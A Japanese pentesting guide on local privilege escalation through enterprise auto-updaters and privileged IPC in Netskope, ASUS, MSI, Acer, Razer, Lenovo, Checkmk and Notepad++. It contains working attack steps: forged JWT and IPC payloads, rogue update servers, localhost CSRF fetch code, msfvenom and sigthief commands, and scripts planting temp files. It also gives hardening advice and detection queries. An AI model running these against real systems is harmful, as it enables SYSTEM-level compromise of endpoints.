# エンタープライズ自動アップデーターと特権 IPC の悪用（例：Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低いハードルで利用できる IPC サーフェスと特権更新フローを公開している、エンタープライズ向けエンドポイントエージェントおよびアップデーターで見つかった、Windows ローカル権限昇格チェーンの一種を一般化して解説します。代表的な例は、Netskope Client for Windows < R129（CVE-2025-0309）です。低権限ユーザーが登録処理を攻撃者のサーバーに誘導し、悪意ある MSI を配信すると、SYSTEM サービスにインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品で応用できる主な手法：
- 特権サービスの localhost IPC を悪用し、攻撃者のサーバーへの再登録または再設定を強制する。
- ベンダーの更新エンドポイントを実装し、不正な Trusted Root CA を配布して、アップデーターに悪意ある「署名済み」パッケージを指定する。
- 弱い署名者チェック（CN の許可リスト）、任意のダイジェストフラグ、緩い MSI プロパティを回避する。
- IPC が「暗号化」されている場合、レジストリに保存された、誰でも読み取り可能なマシン識別子から鍵や IV を導出する。
- サービスが呼び出し元をイメージパスやプロセス名で制限している場合、許可リストにあるプロセスにインジェクションするか、プロセスを一時停止状態で起動し、最小限のスレッドコンテキスト変更を使って DLL をロードする。

カスタムのローカル TCP サービスは、PIN などのアプリケーション認証情報を要求する場合でも、同じように主体の識別と入力境界を確認する必要があります。リスナーをプロセスおよび実効サービスアカウントに対応付けたうえで、実際に配置されているバイナリとバージョンを調べ、呼び出し元が制御できるフィールドが固定長バッファーにコピーされる前、または子プロセスのコマンド構築に使われる前に、長さを検証しているか確認してください。[Microsoft のバッファーオーバーラン対策ガイダンス](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)では、特権を持つネイティブコードで外部入力を検証しないことが危険な理由を説明しています。ループバックリスナー、ハードコードされた認証情報、またはプロセス名だけでは、メモリ破損や SYSTEM 実行が起こるとは限りません。到達可能性、認可、コードパス、緩和策はそれぞれ別個の条件です。通常の列挙は受動的に行い、稼働中のサービスにクラッシュを引き起こす長さの入力を送信しないでください。

---
## 1) localhost IPC 経由で攻撃者のサーバーへの登録を強制する

多くのエージェントには、JSON を使って localhost TCP 経由で SYSTEM サービスと通信するユーザーモードの UI プロセスが付属しています。

Netskope で確認された構成：
- UI：stAgentUI（低整合性） ↔ Service：stAgentSvc（SYSTEM）
- IPC コマンド ID 148：IDP_USER_PROVISIONING_WITH_TOKEN

悪用の流れ：
1) バックエンドのホストを制御するクレーム（例：AddonUrl）を含む JWT 登録トークンを作成する。署名を不要にするため、alg=None を使う。
2) JWT とテナント名を指定して、プロビジョニングコマンドを呼び出す IPC メッセージを送信する：

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) サービスが登録/設定情報を取得するために不正なサーバーへの接続を開始します。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意:
- 呼び出し元の検証がパス/名前ベースの場合は、許可リストに登録されたベンダーのバイナリからリクエストを送信してください（§4を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

### ネットワークに公開された管理用IPC

この信頼境界は、常にlocalhostに限定されるわけではありません。報告されたMyReport Updater 2.1.1のケースでは、`LocalSystem`サービスがすべてのインターフェースで待ち受け、認証なしのgRPC設定変更を受け付けて、参照ホスト、ポート、動作モードを変更できました。リモートから実行するには、リスナーへのネットワークアクセスと、サービスから選択した参照先へのアウトバウンドアクセスの両方が必要でした。これらは、後続のパッケージ処理がファイル書き込みの境界を越えられるかどうかとは別に評価してください。<sup>[[16]](#references)</sup>

---
## 2) 更新チャネルを乗っ取り、SYSTEMとしてコードを実行する

クライアントがあなたのサーバーと通信したら、想定されるエンドポイントを実装し、攻撃者のMSIを取得するよう誘導します。典型的な流れ:

1) /v2/config/org/clientconfig → アップデーターの間隔を極端に短くしたJSON設定を返します。例:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificateを返します。サービスはこれをLocal Machine Trusted Root storeにインストールします。
3) /v2/checkupdate → 悪意のあるMSIと偽のバージョンを指すメタデータを提供します。

実環境でよく見られるチェックのバイパス:
- Signer CNのallow-list: サービスがSubject CNが「netSkope Inc」または「Netskope, Inc.」と一致するかしか確認しない場合があります。rogue CAでそのCNを持つleafを発行し、MSIに署名できます。
- CERT_DIGEST property: CERT_DIGESTという無害なMSI propertyを含めます。インストール時には検証されません。
- 任意のdigest enforcement: config flag（例: check_msi_digest=false）で追加の暗号学的検証を無効にできます。

結果: SYSTEM serviceが
C:\ProgramData\Netskope\stAgent\data\*.msi
からMSIをインストールし、NT AUTHORITY\SYSTEMとして任意のコードを実行します。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypassの教訓: ベンダーがアップデート元を暗号学的に認証する代わりに、少数の「trusted」domainをallow-listに登録して対処した場合でも、攻撃者が通信を誘導できるベンダー所有のredirectorやreverse proxyを探してください。Netskopeの場合、公開された追跡調査で、R129時代のallow-listは攻撃者が制御するAzure App Serviceのコンテンツをproxyする`rproxy.goskope.com`経由で、依然として悪用可能だったことが示されました。hostnameのallow-listは信頼境界ではなく、単なる時間稼ぎと考えてください。<sup>[[14]](#references)</sup>

もう1つの失敗パターンは、**整合性はあるが認証されていないpackage metadata**です。MyReportの事例では、攻撃者が制御する参照先が改変されたarchiveを配信し、中間者がベンダーのMD5 digestとsizeの応答をupdaterに届く前に書き換えていました。それらの値の一致で確認できたのは応答の整合性であり、ベンダーが配信元であることではありません。MD5 collisionは不要でした。呼び出し元がインストール先directoryを選択できたため、特権での展開がfile-write境界になりました。そこから得られるDLL-loading primitiveについては、[任意のfile writeをDLL hijackingにつなげる](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)を参照してください。<sup>[[16]](#references)</sup>

---
## 3) 暗号化されたIPC requestの偽造（存在する場合）

R127以降、NetskopeはIPC JSONを、Base64のように見えるencryptData fieldでラップするようになりました。解析の結果、AESが使われており、key/IVはすべてのユーザーが読み取り可能なregistry値から導出されていました:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現し、標準ユーザーから有効な暗号化済みcommandを送信できます。<sup>[[1]](#references)[[2]](#references)</sup> 一般的なヒント: agentが突然IPCを「暗号化」するようになった場合は、HKLM配下のdevice ID、product GUID、install IDなどが暗号化材料に使われていないか確認してください。

---
## 4) IPC callerのallow-list（path/nameチェック）のバイパス

一部のserviceは、TCP connectionのPIDを特定し、image path/nameがProgram Files配下にあるallow-list登録済みのベンダーbinary（例: stagentui.exe、bwansvc.exe、epdlp.exe）と一致するか確認して、相手を認証しようとします。

実用的なバイパスは2つあります:
- allow-list登録済みprocess（例: nsdiag.exe）にDLL injectionし、その内部からIPCをproxyします。
- allow-list登録済みbinaryをsuspended状態で起動し、CreateRemoteThreadを使わずにproxy DLLをbootstrapします（§5参照）。これにより、driverが適用するtamperルールを満たせます。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protectionに対応したinjection: suspended process + NtContinue patch

製品には、保護対象processのhandleから危険な権限を取り除くminifilter/OB callbacks driver（例: Stadrv）が含まれていることがよくあります:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUMEを削除
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZEに制限

これらの制約に従う信頼性の高いuser-mode loader:
1) vendor binaryをCREATE_SUSPENDEDでCreateProcessします。
2) 使用が許可されているhandleを取得します: processに対するPROCESS_VM_WRITE | PROCESS_VM_OPERATION、およびTHREAD_GET_CONTEXT/THREAD_SET_CONTEXTを持つthread handle（既知のRIP位置でcodeをpatchする場合はTHREAD_RESUMEのみでも可）。
3) ntdll!NtContinue（または他の、早期に確実にmapされるthunk）を、DLL pathを指定してLoadLibraryWを呼び出し、その後元の位置に戻る小さなstubで上書きします。
4) ResumeThreadでstubを実行し、process内でDLLをロードします。

保護対象になった後のprocessに対してPROCESS_CREATE_THREADやPROCESS_SUSPEND_RESUMEを使っていないため（processは自分で作成したため）、driverのpolicyに抵触しません。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 実用的なtooling
- NachoVPN（Netskope plugin）はrogue CA、悪意のあるMSIへの署名、および必要なendpoint（/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate）の提供を自動化します。<sup>[[3]](#references)</sup>
- UpSkopeは、任意のIPC message（AES暗号化も可能）を作成するcustom IPC clientです。allow-list登録済みbinaryから送信するためのsuspended-process injectionも含みます。<sup>[[4]](#references)</sup>

## 7) 未知のupdater/IPC surfaceを素早くtriageする手順

新しいendpoint agentやmotherboardの「helper」suiteに遭遇した場合、簡単な手順で有望なprivesc targetかどうかを判断できます。<sup>[[6]](#references)</sup>

1) loopback listenerを列挙し、ベンダーのprocessと対応付けます:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 候補となる名前付きパイプを列挙する:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) プラグインベースの IPC サーバーが使用する、レジストリに保存されたルーティングデータを抽出する:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) まず user-mode client から endpoint 名、JSON キー、command ID を抽出します。Packed Electron/.NET frontend からは、完全な schema が頻繁に leak します。

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 最終的にプロセスを起動する code path だけでなく、実際の信頼判定条件を探す：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

優先して確認すべきパターン:
- `WinVerifyTrust` を使わずに `CryptQueryObject`/certificate parsing を行っている場合、「証明書が存在する」ことを「証明書が信頼されている」こととして扱っている可能性が高く、certificate cloning などの fake-signer tricks が可能になります。
- `Origin`、`Referer`、download URLs、process names、signer CNs に対する substring/suffix checks は認証ではありません。`contains(".vendor.com")` は、攻撃者が制御する類似ドメインを使って悪用できることがよくあります。
- 低権限の GUI が「このファイルは信頼できる」と判断し、SYSTEM broker がその結果を利用するだけなら、クライアント側 DLL/JS の patch または reimplement によって境界全体を迂回できることがあります（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーし、そのパスから検証または実行をスケジュールする場合は、TOCTOU replacement windows と、チェックの弱い代替 `ExecuteTask()` wrappers を公開する sibling plugin modules をすぐに確認してください。<sup>[[6]](#references)</sup>

named-pipe-heavy targets では、プロトコルを詳しく reverse する前に、PipeViewer を使うと弱い DACLs とリモートから到達可能な pipes を素早く見つけられます。<sup>[[11]](#references)</sup>

target が PID、image path、または process name だけで呼び出し元を認証する場合、それは境界ではなく、単なる障害と考えてください。正規の client への injection、または allow-listed process からの接続だけで、server のチェックを通過できることがよくあります。named pipes の場合は、[client impersonation と pipe abuse に関するこのページ](named-pipe-client-impersonation.md)で、この primitive を詳しく解説しています。

特権を持つ **cleanup or restore broker** では、pipe ACL に加えて path trust boundary も調べてください。service executable とその install directory が保護されていても、低権限の呼び出し元が restore destination を選択したり、共有ディレクトリ内の staged backup artifact を rename したりできる場合があります。呼び出し元が restore command に到達できること、正確な staged input または filename を変更できること、broker がより高い identity で実行されること、restore operation が実際に選択された保護対象パスへ書き込むことを、それぞれ別個に確認してください。書き込み可能な staging directory や読み取り可能な pipe だけでは、任意の特権書き込みが可能とは言えません。destination mapping と service の挙動には、コードレビューまたは管理されたテストが必要です。passive enumeration 中に不明な cleanup command を実行しないでください。ユーザーファイルが削除される可能性があります。

---
## 8) vendor signatures のみで認証する modular add-in brokers（Lenovo Vantage pattern）

新しい調査対象として、**signed-client RPC broker** という亜種があります。低権限の Lenovo-signed desktop process が SYSTEM service と通信し、その service が `%ProgramData%` 配下の XML-described add-ins に JSON commands を振り分けます。受け入れられる signed client のいずれか **内部で code execution を達成すると**、すべての `runas="system"` contracts が攻撃対象になります。<sup>[[15]](#references)</sup>

Lenovo Vantage の調査で確認された価値の高い primitives:
- **vendor によって署名されていることを理由に呼び出し元を信頼する**: 研究者は、Lenovo-signed EXE を書き込み可能なディレクトリにコピーし、DLL side-load（`profapi.dll`）を成立させることで、service がすでに信頼していた client 内で任意の code を実行し、認証済みコンテキストに到達しました。
- **manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 配下で宣言されています。複数の contracts が `SYSTEM` として実行されるため、これらの manifests を列挙すると、broker 自体を reverse するより早く、実際の特権 verbs が判明することがよくあります。
- **認証済み channel の背後にある per-command bugs**: 信頼された client 内に入った後の公開調査では、update/install verbs における path-traversal + race conditions、特権設定データベースへの raw-SQL abuse、意図された hive の外への書き込みを可能にする substring-based registry path checks が見つかりました。

target で役立つ recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

実践的な要点: helper suite が、まず **caller process** を認証してから数十の plugin/add-in コマンドに振り分ける broker を公開している場合、入口の trust check を bypass しただけで調査を終えてはいけません。manifest/contract table をダンプし、権限の高い各 verb を個別に fuzz してください。認証済みの channel の裏には、通常、second-stage のバグがいくつも隠れています。

---
## 1) 特権 HTTP API に対する browser-to-localhost CSRF (ASUS DriverHub)

DriverHub は、127.0.0.1:53000 で user-mode HTTP service (ADU.exe) を実行します。この service は、https://driverhub.asus.com からの browser call を想定しています。Origin filter は、Origin header と `/asus/v1.0/*` が公開する download URL に対して、単純に `string_contains(".asus.com")` を実行します。そのため、`https://driverhub.asus.com.attacker.tld` のような攻撃者が制御する host も check を通過し、JavaScript から状態を変更する request を送信できます。<sup>[[6]](#references)</sup> 追加の bypass パターンについては、[CSRF の基本](../../pentesting-web/csrf-cross-site-request-forgery.md)を参照してください。

実践的な流れ:
1) `.asus.com` を含む domain を登録し、そこに悪意のある webpage をホストします。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` の特権 endpoint (例: `Reboot`、`UpdateApp`) を呼び出します。
3) handler が想定する JSON body を送信します。packed frontend JS に、以下の schema が示されています。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

以下に示す PowerShell CLI でも、Origin ヘッダーを信頼された値に偽装すれば成功します：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

攻撃者のサイトをブラウザーで訪問すると、SYSTEM 権限のヘルパーを動作させる 1 クリック（または `onload` による 0 クリック）のローカル CSRF が発生します。

---
## 2) 安全でないコード署名検証と証明書のクローン（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` は、JSON body で指定された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロード URL の検証にも同じ部分文字列ロジックが使われているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` が受け入れられます。ダウンロード後、ADU.exe は PE に署名が含まれていることと、Subject 文字列が ASUS に一致することだけを確認してから実行します。`WinVerifyTrust` もチェーン検証も行いません。

この処理を weaponize するには:
1) payload を作成します（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の署名者を payload にクローンします（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `.asus.com` に似せたドメインで `pwn.exe` をホストし、上記のブラウザー CSRF 経由で UpdateApp をトリガーします。

Origin と URL の両方のフィルターが部分文字列ベースで、署名者のチェックも文字列比較のみのため、DriverHub は攻撃者のバイナリを取得し、昇格されたコンテキストで実行します。<sup>[[6]](#references)</sup>

---
## 1) updater のコピー/実行パスにおける TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center の SYSTEM サービスは、各フレームが `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成される TCP プロトコルを公開しています。コアコンポーネント（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が含まれています。そのハンドラーは次の処理を行います。
1) 指定された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーします。
2) `CS_CommonAPI.EX_CA::Verify` を使って署名を検証します（証明書の subject が “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
3) 攻撃者が制御する引数を使って、temp ファイルを SYSTEM として実行する scheduled task を作成します。

コピーされたファイルは、検証から `ExecuteTask()` までの間ロックされません。攻撃者は次のことができます。
- 正規の MSI 署名付きバイナリを指定する Frame A を送信します（署名チェックが確実に通り、task がキューに登録されます）。
- 検証完了直後に `MSI Center SDK.exe` を上書きする悪意のある payload を指定した Frame B メッセージを繰り返し送信し、競合を仕掛けます。

scheduler が起動すると、元のファイルを検証済みであるにもかかわらず、上書きされた payload が SYSTEM として実行されます。確実に exploit するには、2 つの goroutine/thread で CMD_AutoUpdateSDK を連続送信し、TOCTOU の隙を突きます。<sup>[[6]](#references)</sup>

---
## 2) カスタム SYSTEM レベル IPC と impersonation の悪用（MSI Center + Acer Control Centre）

### MSI Center TCP command sets
- `MSI.CentralServer.exe` がロードするすべての plugin/DLL には、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存された Component ID が割り当てられます。フレームの最初の 4 bytes でコンポーネントが選択されるため、攻撃者は任意の module に command を送れます。
- plugin は独自の task runner を定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、**署名検証を行わず**に `API_Support.EX_Task::ExecuteTask()` を直接呼び出します。任意のローカルユーザーが `C:\Users\<user>\Desktop\payload.exe` を指定すれば、確実に SYSTEM として実行できます。
- Wireshark で loopback を sniff するか、dnSpy で .NET binaries を instrument すると、Component ↔ command の対応をすぐに確認できます。その後、カスタムの Go/Python clients でフレームを再送できます。<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes と impersonation levels
- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可しています。ファイルパスとともに command ID `7` を送信すると、サービスのプロセス起動ルーチンが呼び出されます。
- クライアントライブラリは、引数とともに magic terminator byte（113）をシリアライズします。Frida/`TsDotNetLib` による動的 instrument（instrumentation のヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、native handler が `CreateProcessAsUser` を呼び出す前に、この値を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に対応付けることが分かります。
- 113（`0x71`）を 114（`0x72`）に置き換えると、SYSTEM token 全体を保持し、high-integrity SID（`S-1-16-12288`）を設定する汎用 branch に入ります。そのため、起動されたバイナリはローカルでもマシン間でも、制限のない SYSTEM として実行されます。
- これに公開されている installer flag（`Setup.exe -nocheck`）を組み合わせると、lab VM でも ACC をセットアップし、ベンダーのハードウェアなしで pipe を試せます。<sup>[[6]](#references)</sup>

これらの IPC の不備は、localhost サービスで相互認証（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を必須にすべき理由と、各 module の「任意の binary を実行する」ヘルパーで同じ署名検証を行うべき理由を示しています。

---
## 3) 弱い user-mode 検証に依存する COM/IPC「elevator」ヘルパー（Razer Synapse 4）

Razer Synapse 4 では、このパターンに当てはまる別の手法が加わりました。低い権限のユーザーが COM ヘルパーに `RzUtility.Elevator` 経由でプロセスを起動させる一方、信頼性の判断は、昇格された境界内で堅牢に実施されず、user-mode DLL（`simple_service.dll`）に委ねられています。

確認された exploit の流れ:
- COM object `RzUtility.Elevator` をインスタンス化します。
- `LaunchProcessNoWait(<path>, "", 1)` を呼び出して、昇格された起動を要求します。
- 公開されている PoC では、要求を送る前に `simple_service.dll` 内の PE 署名チェックを patch で無効化し、攻撃者が選んだ任意の実行ファイルを起動できるようにしています。<sup>[[6]](#references)[[10]](#references)</sup>

最小限の PowerShell 呼び出し:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

一般的な教訓:「helper」スイートをリバースする際は、localhost TCPやnamed pipeだけで調査を止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility`などの名前を持つCOMクラスを確認し、特権サービスが対象のバイナリ自体を検証しているのか、それともパッチ可能なユーザーモードのクライアントDLLが計算した結果を単に信頼しているのかを確かめること。このパターンはRazerに限らず、低権限側が決定した許可／拒否の判断を高権限のブローカーが利用する分離設計であれば、どれもprivescの候補となる攻撃面だ。


---
## MSI修復中の予測可能な一時スクリプト実行（Checkmk Agent / CVE-2024-0670）

一部のWindowsエージェントでは、今も特権操作を実行するために、`C:\Windows\Temp`に一時的な`.cmd`ファイルを書き込み、`SYSTEM`として実行している。ファイル名が予測可能で、サービスが既存ファイルを安全に再作成しない場合、低権限ユーザーは将来使われる一時ファイルをあらかじめ**読み取り専用**で作成し、特権プロセスに自身のスクリプトではなく攻撃者が制御するコンテンツを実行させることができる。

脆弱なCheckmk Agentビルドで確認された内容:
- 一時ファイルのパターン: `cmk_all_<PID>_1.cmd`
- 影響を受けるブランチ: `2.0.0`、`2.1.0`、`2.2.0`
- トリガー: キャッシュされたAgentパッケージのMSI **修復**<sup>[[8]](#references)[[9]](#references)</sup>

実践的な手順:
1. 現在のプロセスIDまたは実行中のAgentのPIDから、現実的なPIDの範囲を推定する。
2. 短い**ASCII**の`.cmd`ペイロードを書く（`Set-Content -Encoding Ascii`または`cmd.exe`のリダイレクトを使う。バッチファイルにUTF-16形式のPowerShell出力を使うのは避ける）。
3. 候補範囲にわたって`C:\Windows\Temp\cmk_all_<PID>_1.cmd`をばらまき、各ファイルを読み取り専用に設定する。
4. キャッシュされたMSIの修復をトリガーし、特権サービスに一時スクリプトを再生成させた後で実行させる。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

脆弱な製品が Windows Installer でインストールされている場合は、修復を実行する前に、`C:\Windows\Installer` 内にある一見ランダムな名前のキャッシュ MSI を製品名に対応付けます。<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

運用上の注意:
- `msiexec /fa` が非対話型の WinRM shell から失敗し、既存のデスクトップセッションまたは切断されたセッションで修復を正しく実行できるか確認する必要がある場合、`qwinsta` が役立ちます。<sup>[[7]](#references)</sup>
- このパターンは、**world-writable な場所に一時スクリプトをステージングし、後で SYSTEM として実行する**他のエンドポイントエージェントや updater にも当てはまります。予測可能な名前、排他的な作成セマンティクスの欠如、およびオンデマンドでトリガー可能な修復／更新フローを確認してください。

### 対話型インストーラーの修復と特権コンソール

PDF24 Creator 11.15.1 は、別種の MSI 修復リスクを示しています。プリンターインストールの custom action が、修復中に SYSTEM 権限で可視コンソールを起動することがあります。ベンダーはこの挙動に対処するため、11.15.2 で MSI インストーラーを変更しました。古い製品バージョンはトリアージの手がかりにすぎません。登録済みまたは到達可能な MSI パッケージ、そのユーザーが修復を開始できるか、脆弱な custom action とログファイルの遅延が存在するか、対話型デスクトップでコンソールが表示されるかを確認してください。報告された遅延には `faxPrnInst.log` に対する oplock が使われていました。通常のファイル書き込み権限だけがアクセス条件ではありません。非対話型 shell、アクセス不能なパッケージ、またはパッチ適用済みインストーラーがあると、攻撃チェーンが成立しない場合があります。この問題は `AlwaysInstallElevated` に依存せず、予測可能な一時スクリプトの置き換えとも異なります。

---
## 弱い updater 検証を介したリモートのサプライチェーン乗っ取り（WinGUp / Notepad++）

2025年6月から2025年12月にかけて、Notepad++ の更新フローを支えるホスティングインフラを侵害した攻撃者は、選定した被害者に悪意ある manifest を選択的に配信しました。古い WinGUp ベースの updater は更新の真正性を十分に検証しておらず、悪意ある XML 応答によってクライアントを攻撃者が制御する URL に誘導できました。クライアントは、信頼できる証明書チェーンとダウンロードしたインストーラーの有効な PE 署名の両方を強制検証せずに HTTPS コンテンツを受け入れたため、被害者はトロイの木馬化された NSIS `update.exe` を取得して実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

運用フロー（ローカルの exploit は不要）:
1. **インフラストラクチャの傍受**: CDN／ホスティングを侵害し、更新チェックに対して悪意あるダウンロード URL を指す攻撃者の metadata を返す。
2. **トロイの木馬化された NSIS**: インストーラーが payload を取得／実行し、次の2つの実行チェーンを悪用する:
   - **Bring-your-own signed binary + sideload**: 署名済みの Bitdefender `BluetoothService.exe` をバンドルし、その検索パスに悪意ある `log.dll` を配置する。署名済みバイナリが実行されると、Windows が `log.dll` を sideload し、同 DLL が Chrysalis backdoor（静的検出を妨げるために Warbird で保護され、API hashing を使用）を復号して reflectively load する。
   - **スクリプトによる shellcode injection**: NSIS が、Win32 API（例: `EnumWindowStationsW`）を使用して shellcode を注入し、Cobalt Strike Beacon をステージングするコンパイル済み Lua script を実行する。<sup>[[12]](#references)</sup>

あらゆる auto-updater に関する hardening／検出の要点:
- ダウンロードしたインストーラーの**証明書と署名の検証**を強制する（ベンダーの署名者を pin し、一致しない CN／chain を拒否する）。また、更新 manifest 自体にも署名する（例: XMLDSig）。検証されていない限り、manifest によるリダイレクトをブロックする。
- **BYO signed binary sideloading**をダウンロード後の検出ポイントとして扱う。署名済みベンダー EXE が正規のインストールパス外にある DLL 名をロードした場合（例: Bitdefender が Temp／Downloads から `log.dll` をロード）、また updater が Temp にベンダー署名のないインストーラーを配置／実行した場合にアラートを出す。
- このチェーンで観測された**マルウェア固有の痕跡**を監視する（汎用的な検出ポイントとして有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への異常な `gup.exe` の書き込み、Lua による shellcode injection の段階。
- Notepad++ は v8.8.9 以降で WinGUp を強化しました。返される XML は署名済み（XMLDSig）となり、新しい build では転送経路だけを信頼するのではなく、ダウンロードしたインストーラーの証明書と署名の検証が強制されます。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender署名済み EXE による <code>log.dll</code> の sideload（T1574.001）</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>がNotepad++以外のインストーラーを起動</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

